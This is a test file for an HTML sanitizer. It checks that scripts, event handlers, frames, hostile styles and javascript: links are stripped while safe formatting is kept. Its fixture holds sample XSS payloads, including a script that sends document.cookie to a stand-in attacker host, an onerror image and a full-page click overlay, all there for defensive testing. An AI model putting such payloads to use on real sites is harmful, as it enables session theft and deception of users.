import { describe, it, expect } from 'vitest';
import { sanitizeHtml, ALLOWED_TAGS, IMAGE_REMOVED_TEXT } from './sanitize-html';

/**
 * The hostile clip from docs/specs/quick-look-outliers-prototype.html: a script, an image
 * with an error handler, a frame, a stylesheet that hides the page, a fixed overlay and a
 * javascript: link.
 */
const HOSTILE =
  '<p><b>Invoice #4471</b> is overdue. <a href="javascript:alert(1)">Pay now</a> or contact ' +
  '<a href="mailto:billing@example.com">billing@example.com</a>.</p>' +
  '<script>fetch("https://evil.example.net/x?c=" + document.cookie)</script>' +
  '<img src="https://evil.example.net/pixel.gif" onerror="alert(2)">' +
  '<iframe src="https://evil.example.net/"></iframe><style>body{display:none}</style>' +
  '<p style="position:fixed;inset:0;background:#fff" onclick="alert(3)">Click anywhere to continue</p>';

describe('sanitizeHtml', () => {
  it('strips everything that could run or load from the hostile clip', () => {
    const { html } = sanitizeHtml(HOSTILE);
    expect(html).not.toMatch(/<script/i);
    expect(html).not.toMatch(/<style/i);
    expect(html).not.toMatch(/<iframe/i);
    expect(html).not.toMatch(/<img/i);
    expect(html).not.toMatch(/\son\w+=/i);
    expect(html).not.toMatch(/javascript:/i);
    expect(html).not.toContain('document.cookie');
    expect(html).not.toContain('display:none');
    expect(html).not.toContain('position:fixed');
    expect(html).not.toContain('evil.example.net');
  });

  it('keeps the invoice text and the mailto link', () => {
    const { html } = sanitizeHtml(HOSTILE);
    expect(html).toContain('<b>Invoice #4471</b> is overdue.');
    expect(html).toContain('<a>Pay now</a>');
    expect(html).toContain('<a href="mailto:billing@example.com">billing@example.com</a>');
    expect(html).toContain('<p>Click anywhere to continue</p>');
  });

  it('replaces an image with the marker', () => {
    const { html } = sanitizeHtml(HOSTILE);
    expect(html).toContain(`<span>${IMAGE_REMOVED_TEXT}</span>`);
    expect(sanitizeHtml('<p>a <img src="x.png" alt="alt text"> b</p>').html).toBe(
      `<p>a <span>${IMAGE_REMOVED_TEXT}</span> b</p>`
    );
  });

  it('reports what it removed, by name and count', () => {
    const { removed } = sanitizeHtml(HOSTILE);
    expect(removed).toEqual({
      script: 1,
      img: 1,
      src: 2,
      onerror: 1,
      iframe: 1,
      style: 2, // the style element and the style attribute
      onclick: 1,
      href: 1, // the javascript: link; the mailto link is kept
    });
  });

  it('reports nothing removed for clean markup', () => {
    const { html, removed } = sanitizeHtml(
      '<p title="t">ok <a href="https://x.y/z" title="l">l</a></p>'
    );
    expect(removed).toEqual({});
    expect(html).toBe('<p title="t">ok <a href="https://x.y/z" title="l">l</a></p>');
  });

  it('keeps only http, https and mailto hrefs', () => {
    expect(sanitizeHtml('<a href="http://a">1</a>').html).toBe('<a href="http://a">1</a>');
    expect(sanitizeHtml('<a href="HTTPS://a">1</a>').html).toBe('<a href="HTTPS://a">1</a>');
    expect(sanitizeHtml('<a href="mailto:x@y">1</a>').html).toBe('<a href="mailto:x@y">1</a>');
    expect(sanitizeHtml('<a href="ftp://a">1</a>').html).toBe('<a>1</a>');
    expect(sanitizeHtml('<a href="//a/b">1</a>').html).toBe('<a>1</a>');
    expect(sanitizeHtml('<a href="/relative">1</a>').html).toBe('<a>1</a>');
    expect(sanitizeHtml('<a href="  javascript:alert(1)">1</a>').html).toBe('<a>1</a>');
    expect(sanitizeHtml('<a href="data:text/html,x">1</a>').html).toBe('<a>1</a>');
    expect(sanitizeHtml('<a name="n" target="_blank">1</a>').html).toBe('<a>1</a>');
  });

  it('drops every attribute except title', () => {
    const { html, removed } = sanitizeHtml(
      '<div id="i" class="c" style="x" data-x="1" title="keep" onmouseover="a()">t</div>'
    );
    expect(html).toBe('<div title="keep">t</div>');
    expect(removed).toEqual({ id: 1, class: 1, style: 1, 'data-x': 1, onmouseover: 1 });
  });

  it('removes the listed dangerous elements with their content', () => {
    const html =
      '<object data="x">obj</object><embed src="x"><link rel="stylesheet" href="x"><meta charset="x">' +
      '<base href="x"><svg><script>1</script><text>svg</text></svg><math><mi>m</mi></math>' +
      '<form action="x"><input value="v"><button>Pay</button><select><option>o</option></select>' +
      '<textarea>ta</textarea></form><video src="x">v</video><audio src="x">a</audio><p>after</p>';
    const result = sanitizeHtml(html);
    for (const tag of [
      'object',
      'embed',
      'link',
      'meta',
      'base',
      'svg',
      'math',
      'form',
      'input',
      'button',
      'select',
      'textarea',
      'video',
      'audio',
    ]) {
      expect(result.html).not.toMatch(new RegExp(`<${tag}[\\s>]`, 'i'));
      expect(result.removed[tag]).toBeGreaterThanOrEqual(1);
    }
    expect(result.html).toContain('<p>after</p>');
    expect(result.html).not.toContain('obj');
    expect(result.html).not.toContain('svg');
    expect(result.html).not.toContain('ta');
  });

  it('unwraps unknown tags and keeps their text', () => {
    expect(sanitizeHtml('<article><section>text <mark>here</mark></section></article>').html).toBe(
      'text here'
    );
  });

  it('keeps every allowed formatting tag', () => {
    for (const tag of ALLOWED_TAGS) {
      if (tag === 'br') continue;
      expect(sanitizeHtml(`<${tag}>x</${tag}>`).html).toBe(`<${tag}>x</${tag}>`);
    }
    expect(sanitizeHtml('a<br>b').html).toBe('a<br />b');
  });

  it('neutralises a comment-hidden script and a mixed-case tag', () => {
    const { html } = sanitizeHtml(
      '<P>x</P><!-- <script>1</script> --><SCRIPT>2</SCRIPT><ScRiPt>3</ScRiPt>'
    );
    expect(html).toBe('<p>x</p>');
  });

  it('returns an empty string for empty input', () => {
    expect(sanitizeHtml('')).toEqual({ html: '', removed: {} });
  });
});
